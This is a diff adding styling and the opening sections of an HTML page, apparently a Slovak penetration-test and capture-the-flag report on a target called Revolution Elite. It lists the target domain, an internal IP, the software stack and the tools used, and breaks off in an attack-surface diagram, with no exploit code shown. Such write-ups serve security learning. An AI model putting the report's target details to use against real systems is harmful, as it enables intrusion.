@@ -16,15 +16,1657 @@
     <script src="https://cdn.jsdelivr.net/npm/mermaid@10.6.1/dist/mermaid.min.js"></script>
 
     <style>
-        /* ... celý CSS kód reportu ... */
+        /* =============================================
+           ZÁKLADNÉ NASTAVENIA - MOBILE FIRST
+        ============================================= */
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            /* Farby */
+            --primary: #EE0000;
+            --primary-light: #E53E3E;
+            --accent: #3182CE;
+            --bg-dark: #0D1117;
+            --bg-darker: #010409;
+            --bg-card: #161B22;
+            --text-light: #F1F5F9;
+            --text-muted: #94A3B8;
+            --border: rgba(238, 0, 0, 0.2);
+            --success: #10B981;
+            --warning: #F59E0B;
+            
+            /* Responzívne spacing */
+            --gap-xs: clamp(0.25rem, 2vw, 0.5rem);
+            --gap-sm: clamp(0.5rem, 3vw, 1rem);
+            --gap-md: clamp(0.75rem, 4vw, 1.5rem);
+            --gap-lg: clamp(1rem, 5vw, 2rem);
+            --gap-xl: clamp(1.25rem, 6vw, 2.5rem);
+            
+            /* Responzívne fonty */
+            --font-xs: clamp(0.7rem, 2.5vw, 0.875rem);
+            --font-sm: clamp(0.8rem, 3vw, 1rem);
+            --font-base: clamp(0.9rem, 3.5vw, 1.125rem);
+            --font-lg: clamp(1rem, 4vw, 1.25rem);
+            --font-xl: clamp(1.1rem, 5vw, 1.5rem);
+            --font-2xl: clamp(1.3rem, 6vw, 2rem);
+            --font-3xl: clamp(1.8rem, 8vw, 3rem);
+            
+            /* Fonts */
+            --font-main: 'Red Hat Display', sans-serif;
+            --font-code: 'Red Hat Mono', monospace;
+            
+            /* Shadows & effects */
+            --shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            --shadow-lg: 0 8px 25px rgba(0, 0, 0, 0.5);
+            --blur: 15px;
+            --radius: clamp(0.5rem, 2vw, 1rem);
+        }
+
+        html {
+            scroll-behavior: smooth;
+            font-size: 16px;
+        }
+
+        body {
+            font-family: var(--font-main);
+            background: var(--bg-dark);
+            color: var(--text-light);
+            line-height: 1.6;
+            font-size: var(--font-base);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        /* Animované pozadie */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(238, 0, 0, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(49, 130, 206, 0.02) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        /* =============================================
+           HLAVNÝ KONTAJNER SYSTÉM
+        ============================================= */
+        
+        .main-wrapper {
+            width: 100%;
+            max-width: 100vw;
+            margin: 0 auto;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .container {
+            width: 100%;
+            max-width: min(1200px, 95vw);
+            margin: 0 auto;
+            padding: 0 var(--gap-sm);
+            box-sizing: border-box;
+        }
+
+        /* =============================================
+           BANNER SYSTÉM
+        ============================================= */
+        
+        .banner {
+            background: linear-gradient(90deg, var(--primary), var(--primary-light), var(--accent));
+            color: white;
+            text-align: center;
+            padding: var(--gap-sm);
+            font-weight: 700;
+            letter-spacing: 1px;
+            font-size: var(--font-xs);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: var(--shadow);
+            word-break: break-word;
+        }
+
+        .banner-bottom {
+            background: linear-gradient(90deg, var(--primary), var(--primary-light), var(--accent));
+            color: white;
+            text-align: center;
+            padding: var(--gap-sm);
+            font-weight: 700;
+            letter-spacing: 1px;
+            font-size: var(--font-xs);
+            box-shadow: 0 -4px 10px rgba(0, 0, 0, 0.3);
+            word-break: break-word;
+        }
+
+        /* =============================================
+           HEADER SEKTION - OPRAVENÉ PRE RESPONZIVITU
+        ============================================= */
+        
+        .header {
+            background: linear-gradient(135deg, var(--bg-card) 0%, var(--bg-dark) 100%);
+            padding: var(--gap-lg) 0;
+            border-bottom: 1px solid var(--border);
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary), var(--primary-light), var(--accent));
+        }
+
+        .header-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: var(--gap-lg);
+            text-align: center;
+            width: 100%;
+            max-width: 100%;
+            overflow: hidden;
+        }
+
+        /* Profile Section */
+        .profile-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: var(--gap-md);
+            flex-shrink: 0;
+        }
+
+        .profile-img-container {
+            width: min(100px, 20vw);
+            height: min(100px, 20vw);
+            border-radius: 50%;
+            overflow: hidden;
+            border: 3px solid var(--primary);
+            box-shadow: 
+                0 0 30px rgba(238, 0, 0, 0.4),
+                0 0 60px rgba(238, 0, 0, 0.2);
+            background: linear-gradient(135deg, rgba(238, 0, 0, 0.1), rgba(49, 130, 206, 0.05));
+            position: relative;
+            flex-shrink: 0;
+        }
+
+        .profile-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: brightness(1.1) contrast(1.2);
+        }
+
+        /* Main Info Section */
+        .main-info {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: var(--gap-sm);
+            width: 100%;
+            max-width: 100%;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        .brand-title {
+            font-size: var(--font-3xl);
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--primary), var(--primary-light), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -1px;
+            line-height: 1.1;
+            text-transform: uppercase;
+            margin: 0;
+            width: 100%;
+            max-width: 100%;
+            word-break: break-word;
+            overflow-wrap: break-word;
+            hyphens: auto;
+        }
+
+        .subtitle {
+            font-size: var(--font-base);
+            color: var(--text-muted);
+            max-width: min(600px, 90vw);
+            margin: 0 auto;
+            line-height: 1.5;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            hyphens: auto;
+            text-align: center;
+        }
+
+        .badge {
+            display: inline-block;
+            background: linear-gradient(135deg, rgba(238, 0, 0, 0.2), rgba(229, 62, 62, 0.15));
+            color: var(--primary);
+            border: 1px solid rgba(238, 0, 0, 0.4);
+            border-radius: 2rem;
+            padding: var(--gap-xs) var(--gap-md);
+            font-size: var(--font-sm);
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin: var(--gap-xs) 0;
+            word-break: keep-all;
+            flex-shrink: 0;
+        }
+
+        /* Contact Section */
+        .contact-section {
+            width: 100%;
+            max-width: 100%;
+            display: flex;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .contact-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(min(180px, 40vw), 1fr));
+            gap: var(--gap-sm);
+            width: 100%;
+            max-width: min(800px, 95vw);
+            margin: 0 auto;
+        }
+
+        .contact-item {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: var(--gap-xs);
+            color: var(--text-muted);
+            font-size: var(--font-sm);
+            padding: var(--gap-xs);
+            border-radius: var(--radius);
+            transition: all 0.3s ease;
+            word-break: break-word;
+            overflow-wrap: break-word;
+            text-align: center;
+            min-width: 0;
+            max-width: 100%;
+        }
+
+        .contact-item:hover {
+            color: var(--text-light);
+            background: rgba(238, 0, 0, 0.1);
+        }
+
+        .contact-icon {
+            color: var(--primary);
+            font-size: var(--font-lg);
+            min-width: 20px;
+            flex-shrink: 0;
+        }
+
+        .contact-item a {
+            color: inherit;
+            text-decoration: none;
+            word-break: break-all;
+            overflow-wrap: break-word;
+            min-width: 0;
+        }
+
+        .contact-item span {
+            word-break: break-word;
+            overflow-wrap: break-word;
+            min-width: 0;
+        }
+
+        /* =============================================
+           HLAVNÝ OBSAH
+        ============================================= */
+        
+        .main-content {
+            padding: var(--gap-lg) 0;
+            width: 100%;
+            overflow-x: hidden;
+        }
+
+        .content-section {
+            margin-bottom: var(--gap-xl);
+            width: 100%;
+            overflow-x: hidden;
+        }
+
+        .section-card {
+            background: linear-gradient(135deg, rgba(22, 27, 34, 0.9), rgba(13, 17, 23, 0.8));
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            box-shadow: var(--shadow-lg);
+            position: relative;
+            transition: transform 0.3s ease;
+            margin-bottom: var(--gap-lg);
+            width: 100%;
+        }
+
+        .section-card:hover {
+            transform: translateY(-2px);
+        }
+
+        .section-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--primary-light), var(--accent));
+        }
+
+        .card-header {
+            padding: var(--gap-md) var(--gap-lg);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: var(--gap-sm);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .card-title {
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 800;
+            font-size: var(--font-xl);
+            margin: 0;
+            display: flex;
+            align-items: center;
+            gap: var(--gap-sm);
+            word-break: break-word;
+            overflow-wrap: break-word;
+            flex: 1;
+            min-width: 0;
+        }
+
+        .card-icon {
+            color: var(--primary);
+            font-size: var(--font-xl);
+            flex-shrink: 0;
+        }
+
+        .card-body {
+            padding: var(--gap-lg);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            overflow-x: auto;
+        }
+
+        /* =============================================
+           KOMPONENTY
+        ============================================= */
+        
+        .info-box {
+            border-radius: var(--radius);
+            padding: var(--gap-md);
+            margin: var(--gap-md) 0;
+            position: relative;
+            backdrop-filter: blur(var(--blur));
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .info-box::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            border-radius: var(--radius) var(--radius) 0 0;
+        }
+
+        .info-box.info {
+            background: linear-gradient(135deg, rgba(49, 130, 206, 0.15), rgba(59, 130, 246, 0.1));
+            border: 1px solid rgba(49, 130, 206, 0.4);
+        }
+        .info-box.info::before { background: linear-gradient(90deg, var(--accent), #3b82f6); }
+
+        .info-box.success {
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.15), rgba(5, 150, 105, 0.1));
+            border: 1px solid rgba(16, 185, 129, 0.4);
+        }
+        .info-box.success::before { background: linear-gradient(90deg, var(--success), #059669); }
+
+        .info-box.warning {
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.15), rgba(217, 119, 6, 0.1));
+            border: 1px solid rgba(245, 158, 11, 0.4);
+        }
+        .info-box.warning::before { background: linear-gradient(90deg, var(--warning), #d97706); }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(min(150px, 40vw), 1fr));
+            gap: var(--gap-md);
+            margin: var(--gap-lg) 0;
+        }
+
+        .stat-card {
+            background: linear-gradient(135deg, rgba(13, 17, 23, 0.9), rgba(22, 27, 34, 0.8));
+            padding: var(--gap-md);
+            border-radius: var(--radius);
+            text-align: center;
+            border: 1px solid var(--border);
+            position: relative;
+            transition: all 0.3s ease;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-2px);
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--primary-light));
+        }
+
+        .stat-number {
+            font-size: var(--font-2xl);
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: var(--gap-xs);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 60px;
+        }
+
+        .stat-label {
+            font-size: var(--font-xs);
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
+            word-break: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: var(--gap-md) 0;
+            border-radius: var(--radius);
+            overflow: hidden;
+            box-shadow: var(--shadow);
+            font-size: var(--font-sm);
+            table-layout: fixed;
+        }
+
+        .data-table th {
+            background: linear-gradient(135deg, var(--bg-darker), var(--bg-card));
+            padding: var(--gap-sm);
+            font-weight: 700;
+            text-align: left;
+            color: var(--text-light);
+            border-bottom: 1px solid var(--border);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .data-table td {
+            padding: var(--gap-sm);
+            border-bottom: 1px solid rgba(148, 163, 184, 0.1);
+            vertical-align: top;
+            background: rgba(22, 27, 34, 0.7);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .data-table tr:last-child td {
+            border-bottom: none;
+        }
+
+        .data-table tr:hover td {
+            background: rgba(238, 0, 0, 0.05);
+        }
+
+        .code-block {
+            background: linear-gradient(135deg, var(--bg-darker), var(--bg-dark));
+            border-radius: var(--radius);
+            padding: var(--gap-md);
+            margin: var(--gap-md) 0;
+            overflow-x: auto;
+            font-family: var(--font-code);
+            font-size: var(--font-xs);
+            border: 1px solid var(--border);
+            position: relative;
+            line-height: 1.4;
+            word-break: break-all;
+            overflow-wrap: break-word;
+        }
+
+        .code-block::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--primary), var(--success));
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            border-radius: 999px;
+            padding: 0.25rem 0.75rem;
+            font-size: var(--font-xs);
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            word-break: keep-all;
+            flex-shrink: 0;
+        }
+
+        .status-badge.critical {
+            background: linear-gradient(135deg, rgba(238, 0, 0, 0.25), rgba(229, 62, 62, 0.15));
+            color: var(--primary);
+            border: 1px solid rgba(238, 0, 0, 0.5);
+        }
+
+        .status-badge.high {
+            background: linear-gradient(135deg, rgba(220, 38, 38, 0.25), rgba(239, 68, 68, 0.15));
+            color: #ef4444;
+            border: 1px solid rgba(220, 38, 38, 0.5);
+        }
+
+        .status-badge.medium {
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.25), rgba(251, 191, 36, 0.15));
+            color: var(--warning);
+            border: 1px solid rgba(245, 158, 11, 0.5);
+        }
+
+        .highlight {
+            background: linear-gradient(135deg, rgba(13, 17, 23, 0.9), rgba(22, 27, 34, 0.8));
+            border-left: 4px solid var(--primary);
+            padding: var(--gap-md);
+            margin: var(--gap-md) 0;
+            border-radius: var(--radius);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .diagram-container {
+            background: linear-gradient(135deg, rgba(1, 4, 9, 0.95), rgba(13, 17, 23, 0.9));
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: var(--gap-md);
+            margin: var(--gap-lg) 0;
+            text-align: center;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .diagram-title {
+            margin-bottom: var(--gap-md);
+            font-size: var(--font-lg);
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .mermaid {
+            width: 100% !important;
+            height: auto !important;
+            min-height: min(350px, 50vh) !important;
+            font-size: clamp(8px, 2vw, 12px) !important;
+            overflow: visible !important;
+        }
+
+        .timeline {
+            position: relative;
+            padding-left: var(--gap-lg);
+        }
+
+        .timeline::before {
+            content: '';
+            position: absolute;
+            left: var(--gap-sm);
+            top: 0;
+            bottom: 0;
+            width: 4px;
+            background: linear-gradient(180deg, var(--primary), var(--primary-light), var(--accent));
+        }
+
+        .timeline-item {
+            position: relative;
+            margin-left: var(--gap-lg);
+            margin-bottom: var(--gap-lg);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: calc(-1 * var(--gap-lg) - var(--gap-md));
+            top: var(--gap-sm);
+            width: 1rem;
+            height: 1rem;
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            border-radius: 50%;
+            border: 3px solid var(--bg-dark);
+            box-shadow: 0 0 10px rgba(238, 0, 0, 0.5);
+        }
+
+        /* CTF Flag Box - Opravené zarovnanie */
+        .ctf-flag-container {
+            text-align: center;
+            padding: var(--gap-lg);
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(5, 150, 105, 0.1));
+            border-radius: var(--radius);
+            border: 2px solid var(--success);
+            margin: var(--gap-md) 0;
+            position: relative;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .ctf-flag-container::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--success), #059669);
+            border-radius: var(--radius) var(--radius) 0 0;
+        }
+
+        .ctf-flag-title {
+            font-size: var(--font-lg);
+            font-weight: 700;
+            color: var(--success);
+            margin-bottom: var(--gap-sm);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: var(--gap-xs);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .ctf-flag-content {
+            font-family: var(--font-code);
+            font-size: clamp(0.9rem, 4vw, 1.8rem);
+            font-weight: 900;
+            color: var(--success);
+            margin-bottom: var(--gap-xs);
+            word-break: break-all;
+            overflow-wrap: break-word;
+            line-height: 1.2;
+            padding: var(--gap-sm) 0;
+        }
+
+        .ctf-flag-subtitle {
+            font-size: var(--font-sm);
+            color: var(--success);
+            opacity: 0.8;
+            font-style: italic;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        /* =============================================
+           FOOTER - OPRAVENÉ PRE HORIZONTÁLNE ROZDELENIE KONTAKTU
+        ============================================= */
+        
+        .footer {
+            background: linear-gradient(135deg, rgba(1, 4, 9, 0.95), rgba(13, 17, 23, 0.9));
+            padding: var(--gap-xl) 0;
+            border-top: 1px solid var(--border);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .footer-highlight {
+            background: linear-gradient(90deg, var(--primary), var(--primary-light), var(--accent));
+            color: white;
+            padding: var(--gap-xs) var(--gap-md);
+            border-radius: var(--radius);
+            display: inline-block;
+            margin-bottom: var(--gap-lg);
+            font-weight: 700;
+            font-size: var(--font-sm);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(min(200px, 100%), 1fr));
+            gap: var(--gap-lg);
+            margin-bottom: var(--gap-lg);
+        }
+
+        .footer-section h4 {
+            color: var(--text-light);
+            font-weight: 700;
+            margin-bottom: var(--gap-sm);
+            display: flex;
+            align-items: center;
+            gap: var(--gap-xs);
+            font-size: var(--font-base);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .footer-section p {
+            margin-bottom: 0.3rem;
+            font-size: var(--font-sm);
+            color: var(--text-muted);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        .footer-section a {
+            color: inherit;
+            text-decoration: none;
+            transition: color 0.3s ease;
+            word-break: break-all;
+            overflow-wrap: break-word;
+        }
+
+        .footer-section a:hover {
+            color: var(--primary);
+        }
+
+        /* Špeciálne rozdelenie kontaktu pre horizontálne rozloženie */
+        .contact-split {
+            display: none; /* Skrytý na mobile */
+        }
+
+        .contact-unified {
+            display: block; /* Zobrazený na mobile */
+        }
+
+        .footer-bottom {
+            border-top: 1px solid rgba(148, 163, 184, 0.2);
+            padding-top: var(--gap-sm);
+            font-size: var(--font-xs);
+            text-align: center;
+            color: var(--text-muted);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        /* Watermark */
+        .watermark {
+            position: fixed;
+            bottom: var(--gap-md);
+            right: var(--gap-md);
+            width: clamp(40px, 6vw, 60px);
+            height: clamp(40px, 6vw, 60px);
+            opacity: 0.1;
+            pointer-events: none;
+            z-index: 50;
+            filter: grayscale(80%) contrast(120%);
+            border-radius: var(--radius);
+        }
+
+        /* =============================================
+           RESPONZÍVNE MEDIA QUERIES
+        ============================================= */
+        
+        @media (min-width: 480px) {
+            .contact-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .profile-img-container {
+                width: min(120px, 22vw);
+                height: min(120px, 22vw);
+            }
+        }
+
+        @media (min-width: 768px) {
+            .header-content {
+                flex-direction: row;
+                justify-content: space-between;
+                text-align: left;
+                align-items: flex-start;
+            }
+
+            .main-info {
+                text-align: center;
+                flex: 1;
+                max-width: none;
+            }
+
+            .contact-section {
+                text-align: right;
+                max-width: none;
+            }
+
+            .contact-grid {
+                grid-template-columns: 1fr;
+                max-width: 300px;
+                text-align: right;
+            }
+
+            .contact-item {
+                justify-content: flex-end;
+            }
+
+            .stats-grid {
+                grid-template-columns: repeat(4, 1fr);
+            }
+
+            .data-table {
+                font-size: var(--font-sm);
+            }
+
+            .timeline {
+                padding-left: 3rem;
+            }
+
+            .timeline-item {
+                margin-left: 3rem;
+            }
+
+            .timeline-item::before {
+                left: -4rem;
+                width: 1.5rem;
+                height: 1.5rem;
+            }
+
+            /* Horizontálne rozdelenie kontaktu pre tablet/desktop */
+            .contact-unified {
+                display: none; /* Skryť unified kontakt */
+            }
+
+            .contact-split {
+                display: block; /* Zobraziť rozdelený kontakt */
+            }
+
+            .footer-grid {
+                grid-template-columns: repeat(4, 1fr); /* 4 stĺpce pre lepšie rozdelenie */
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .header-content {
+                display: grid;
+                grid-template-columns: auto 1fr auto;
+                gap: var(--gap-xl);
+                align-items: center;
+            }
+
+            .profile-img-container {
+                width: 120px;
+                height: 120px;
+            }
+        }
+
+        @media (max-width: 479px) {
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: var(--gap-sm);
+            }
+
+            .data-table {
+                font-size: var(--font-xs);
+            }
+
+            .data-table th,
+            .data-table td {
+                padding: var(--gap-xs);
+            }
+
+            .timeline {
+                padding-left: var(--gap-md);
+            }
+
+            .timeline-item {
+                margin-left: var(--gap-md);
+            }
+
+            .timeline-item::before {
+                left: -1.5rem;
+                width: 0.75rem;
+                height: 0.75rem;
+            }
+
+            .contact-grid {
+                grid-template-columns: 1fr;
+                gap: var(--gap-xs);
+            }
+
+            .contact-item {
+                font-size: var(--font-xs);
+                padding: var(--gap-xs);
+            }
+
+            .brand-title {
+                word-break: break-word;
+                hyphens: auto;
+            }
+        }
+
+        /* Print styles */
+        @media print {
+            * {
+                -webkit-print-color-adjust: exact !important;
+                color-adjust: exact !important;
+            }
+
+            body {
+                background: var(--bg-dark) !important;
+                font-size: 12pt !important;
+                overflow: visible !important;
+            }
+
+            .banner {
+                position: relative !important;
+            }
+
+            .section-card {
+                page-break-inside: avoid;
+                margin-bottom: 1rem;
+            }
+
+            .watermark {
+                display: none !important;
+            }
+
+            .main-wrapper {
+                overflow: visible !important;
+            }
+        }
+
+        /* Utility classes */
+        .text-center { text-align: center; }
+        .text-left { text-align: left; }
+        .text-right { text-align: right; }
+        .text-justify { text-align: justify; }
+
+        .font-bold { font-weight: 700; }
+        .font-semibold { font-weight: 600; }
+
+        .text-primary { color: var(--text-light); }
+        .text-muted { color: var(--text-muted); }
+        .text-red { color: var(--primary); }
+        .text-blue { color: var(--accent); }
+        .text-green { color: var(--success); }
+        .text-yellow { color: var(--warning); }
+
+        .mb-2 { margin-bottom: 0.5rem; }
+        .mb-3 { margin-bottom: 0.75rem; }
+        .mb-4 { margin-bottom: 1rem; }
+        .mr-2 { margin-right: 0.5rem; }
+        .ml-2 { margin-left: 0.5rem; }
+
+        .grid { display: grid; }
+        .flex { display: flex; }
+        .items-center { align-items: center; }
+        .justify-center { justify-content: center; }
+
+        .uppercase { text-transform: uppercase; }
+
+        .list-disc { list-style-type: disc; }
+        .pl-6 { padding-left: 1.5rem; }
+        .space-y-1 > * + * { margin-top: 0.25rem; }
+
+        .text-xl { font-size: var(--font-xl); }
+        .text-2xl { font-size: var(--font-2xl); }
+        .text-lg { font-size: var(--font-lg); }
+        .text-sm { font-size: var(--font-sm); }
     </style>
 </head>
 <body>
     <div class="main-wrapper">
-        <!-- ... celý HTML obsah reportu ... -->
+        <!-- TOP BANNER -->
+        <div class="banner">
+            <i class="fas fa-terminal"></i> REVOLUTION ELITE PENETRAČNÝ TEST // SYSTÉM KOMPROMITOVANÝ // CTF VLAJKA ZACHYTENÁ <i class="fas fa-skull-crossbones"></i>
+        </div>
+
+        <!-- Watermark -->
+        <img src="https://nethemba.com/wp-content/uploads/2025/03/HeroImg-squared-1-1-768x633.png" alt="Nethemba" class="watermark">
+
+        <!-- HEADER -->
+        <header class="header">
+            <div class="container">
+                <div class="header-content">
+                    <!-- Profile Section -->
+                    <div class="profile-section">
+                        <div class="profile-img-container">
+                            <img src="https://lh3.googleusercontent.com/a/ACg8ocLRYEzgRqeALvAywDx8S6gcBarEkuDdZ5JadRxFhNuyMJT4qKY=s192-c-mo" alt="Kristián Kašník" class="profile-img">
+                        </div>
+                    </div>
+
+                    <!-- Main Info -->
+                    <div class="main-info">
+                        <h1 class="brand-title">REVOLUTION ELITE</h1>
+                        <div class="badge">Penetračný Test</div>
+                        <p class="subtitle">
+                            Komplexný penetračný test webovej aplikácie s úspešnou kompromitáciou systému. 
+                            Systematická exploitácia zraniteľností a zachytenie CTF vlajky.
+                        </p>
+                    </div>
+
+                    <!-- Contact -->
+                    <div class="contact-section">
+                        <div class="contact-grid">
+                            <div class="contact-item">
+                                <i class="fas fa-user contact-icon"></i>
+                                <span><strong>Kristián Kašník</strong></span>
+                            </div>
+                            <div class="contact-item">
+                                <i class="fas fa-envelope contact-icon"></i>
+                                <a href="mailto:itssafer@itssafer.org">itssafer@itssafer.org</a>
+                            </div>
+                            <div class="contact-item">
+                                <i class="fas fa-phone contact-icon"></i>
+                                <a href="tel:+421950381419">+421 950 381 419</a>
+                            </div>
+                            <div class="contact-item">
+                                <i class="fab fa-github contact-icon"></i>
+                                <a href="https://github.com/ITSsafer-DevOps" target="_blank">GitHub</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- MAIN CONTENT -->
+        <main class="main-content">
+            <div class="container">
+                <!-- Prehľad Penetračného Testu -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-flag-checkered card-icon"></i>
+                            <h2 class="card-title">Prehľad Penetračného Testu</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="info-box info">
+                                <h3 class="text-xl font-bold mb-3 text-blue">
+                                    <i class="fas fa-target mr-2"></i>REVOLUTION ELITE PENETRAČNÝ TEST
+                                </h3>
+                                <p class="text-justify mb-3">
+                                    <strong>Revolution Elite Penetračný Test</strong> - systematické testovanie bezpečnosti 
+                                    zamerané na identifikáciu a exploitáciu zraniteľností. Cieľom bolo získať úplnú kontrolu 
+                                    nad cieľovým systémom a extrahovať CTF vlajku.
+                                </p>
+                                <p class="text-justify">
+                                    Test zahŕňa komplexnú analýzu bezpečnosti webových aplikácií, testovanie oprávnení, 
+                                    validáciu vstupov a systémovú bezpečnosť.
+                                </p>
+                            </div>
+
+                            <div class="stats-grid">
+                                <div class="stat-card">
+                                    <div class="stat-number"><i class="fas fa-bolt"></i></div>
+                                    <div class="stat-label">Expert Level</div>
+                                </div>
+                                <div class="stat-card">
+                                    <div class="stat-number"><i class="fas fa-check-circle"></i></div>
+                                    <div class="stat-label">Úspešne Dokončené</div>
+                                </div>
+                                <div class="stat-card">
+                                    <div class="stat-number"><i class="fas fa-skull"></i></div>
+                                    <div class="stat-label">Systém Kompromitovaný</div>
+                                </div>
+                                <div class="stat-card">
+                                    <div class="stat-number"><i class="fas fa-flag"></i></div>
+                                    <div class="stat-label">CTF Vlajka Zachytená</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Testované Prostredie -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-server card-icon"></i>
+                            <h2 class="card-title">Testované Prostredie</h2>
+                        </div>
+                        <div class="card-body">
+                            <table class="data-table">
+                                <tbody>
+                                    <tr><th>Cieľová Aplikácia</th><td><strong>Revolution Elite</strong></td></tr>
+                                    <tr><th>Doména</th><td>revolutionelite.co.uk</td></tr>
+                                    <tr><th>IP adresa servera</th><td>172.31.16.8/24</td></tr>
+                                    <tr><th>Operačný systém</th><td>Debian GNU/Linux 12 (Bookworm)</td></tr>
+                                    <tr><th>Webový stack</th><td>Apache 2.4 + PHP 8.1 + MySQL 8.0.34</td></tr>
+                                    <tr><th>Dátum testovania</th><td>16. augusta 2025</td></tr>
+                                    <tr><th>Metodológia</th><td>OWASP WSTG, NIST SP 800-115, PTES</td></tr>
+                                </tbody>
+                            </table>
+
+                            <div class="diagram-container">
+                                <h3 class="diagram-title">Mapa Útočnej Plochy a Kompromitácie</h3>
+                                <div class="mermaid">
+                                    graph TB
+                                        subgraph "🌐 TESTOVANIE"
+                                            Tester[👨‍💻 HACKER<br/>Kristián Kašník]
+                                            Tools[🛠️ NÁSTROJE<br/>Nmap • Burp Suite • SQLMap]
+                                        end
+                                        
+                                        subgraph "🎯 CIEĽOVÝ SYSTÉM" 
